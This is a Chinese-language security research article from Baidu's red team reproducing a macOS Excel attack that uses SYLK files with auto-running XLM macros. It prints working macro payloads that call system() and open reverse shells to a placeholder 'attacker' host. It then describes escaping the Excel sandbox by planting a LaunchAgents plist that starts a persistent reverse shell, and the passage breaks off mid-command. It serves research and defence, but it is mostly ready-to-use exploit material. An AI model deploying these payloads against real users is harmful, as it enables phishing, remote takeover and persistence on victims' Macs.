**作者：t1ddl3r@百度蓝军  
公众号：[百度安全应急响应中心](https://mp.weixin.qq.com/s/a_0Vbnr38drTZAlQfoH10A
"百度安全应急响应中心")**
### 前言
在正面防御越来越难突破的今天，各种钓鱼姿势层出不穷。本月的BlackHat
2020大会上出现了一种新型的macOS下的excel宏攻击，通过巧妙的漏洞链绕过了Mac沙箱，最终获得了一枚反弹shell。笔者在研究过程中遇到了一些坑点，最终成功复现。希望文章中的一些经验能够起到抛砖引玉的作用。
### 1.XLM宏与Sylk文件
Sylk文件是一种古老的office文件格式，虽然如今已经几乎不再使用此格式，但office仍然支持打开该格式的文件。在macOS下，双击.slk文件会默认调起Excel打开。
在Sylk文件中，VBA宏会失效，它支持另一种古老的XLM宏。一个恶意的XLM宏如下：
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC","curl http://www.toutiao.com/")
    C;X1;Y102;K0;EHALT()
    E
其中第一行是Sylk文件标记，第二行表示此文档启用了XLM宏，第三行表示文档打开时，自动执行文档中第101行的代码。后面的X与Y指代单元格坐标，如‘C;X1;Y101’代表101行第1列的单元格，而‘;E’代表表达式，后面跟随的为XLM宏的表达式值。
‘CALL("libc.dylib","system","JC","curl http://www.toutiao.com")’
表示调用libc.dylib中的system命令执行其后的bash命令。宏命令必须以HALK()或RETURN()结束，即第四行。结尾的E表示E标记结束。
将其另存为poc.slk文件，直接运行，便会在打开文件时执行curl http://www.toutiao.com。
在Mac Office
2011中，打开此文件时不会有任何危险提示，直接运行恶意命令，不过微软已经停止了对2011的支持，并且网上已经很难下载到2011版本。在Mac Office
2016/2019中（现已修复），若用户将偏好设置-安全性-宏安全性设置为‘禁用所有宏，并且不通知’，恶意宏命令也将自动执行。可惜的是，此设置并非默认的（默认为‘禁用所有宏，并发出通知’）。
尽管如此，这也会比Windows上的宏攻击更容易成功。在Windows中，只有用户主动点击安全警告中的启用内容时，宏才会被执行。而由于安全警告并不影响文档的正常使用，普通用户一般也不会主动启用宏。
 而内置XLM宏的Sylk文件被打开时，Mac Office
2016/2019默认设置下会发出弹窗安全警告：
用户必须在启用宏和禁用宏中选择一个才能继续使用文档。这就意味着，在普通用户缺乏安全意识的情况下，有50%的几率中招。
### 2.执行恶意命令
我们将宏代码修改为反弹shell的代码：
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC", "/bin/sh -i >& /dev/tcp/attacker/8911 0>&1")
    C;X1;Y102;K0;EHALT()
    E
运行后attacker上会收到一个反弹shell，而运行此文件的mac将直接卡死。这是因为bash
-i会阻塞后续代码的运行，在编写宏时应特别注意这一点，否则会有一种受到了DOS攻击的表现。我们将代码修改为后台运行的反弹shell：
    ID;P
    O;E
    NN;NAuto_open;ER101
    C;X1;Y101;K0;ECALL("libc.dylib","system","JC", "/bin/sh -c '(/bin/sh -i >& /dev/tcp/attacker/8911 0>&1 &)'")
    C;X1;Y102;K0;EHALT()
    E
成功收到一个反弹shell，且文档关闭后反弹shell仍可正常运行。
    sh-3.2$ pwd
    /Users/yu/Library/Containers/com.microsoft.Excel/Data
    sh-3.2$ ls
    Desktop
    Documents
    Downloads
    Library
    Movies
    Music
    Pictures
    logs
    sh-3.2$ cd /Users/yu
    sh-3.2$ ls
    ls: .: Operation not permitted
经过一系列测试发现，此时反弹shell处于Excel的沙盒内。当处于com.microsoft.Excel/Data内时，bash功能正常；当想切换出沙盒目录时，虽然切换目录成功，但无法执行其他有效操作。这大大降低了shell的作用，即使由shell派生出新的进程，该子进程也将继承父进程的沙盒特性，除非我们能够让一个不在沙盒中的进程主动启动反弹shell。
### 3.沙盒逃逸
沙盒逃逸是这个议题主要的价值所在，但在复现过程中，笔者发现仅靠原作者的方式难以将整个漏洞利用链打通，故有了各种踩坑尝试。
##### 3.1 plist
使用codesign查看Excel的权限：
    codesign --display -v --entitlement - /Applications/Microsoft\ Excel.app
可以看到允许写入文件名以‘~$’开始的文件：
    (allow file-read* file-write*
         (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$"))
    )
这是典型的office临时文件的文件名格式。尝试在沙盒外生成一个符合规则的文件：
    sh-3.2$ pwd
    /Users/yu
    sh-3.2$ echo "t1ddl3r">\~\$hello
    sh-3.2$ cat \~\$hello
    t1ddl3r
    sh-3.2$
成功写入，不会再像之前是‘Operation not
permitted’的状态。由此，所有涉及增删改查和执行的文件操作命令，一旦所操作的文件的文件名符合上述规则，便可成功执行。当然，如果操作的是文件夹就不可以。
根据此特性，我们可以向‘~/Library/LaunchAgents’写入一个plist文件，待下次mac启动后，就会自动运行此plist文件，执行我们写入的命令，此时由于命令是由plist拉起的，而并非Excel派生的，便不再处于Excel沙盒之下了。plist文件如下：
    Label
    com.microsoft
    ProgramArguments
    /bin/bash
    -c
    bash -i >& /dev/tcp/attcker/8911 0>&1
    KeepAlive
    RunAtLoad
    StartInterval
    1
当mac启动时，会自动执行‘/bin/bash -c bash -i >& /dev/tcp/attcker/8911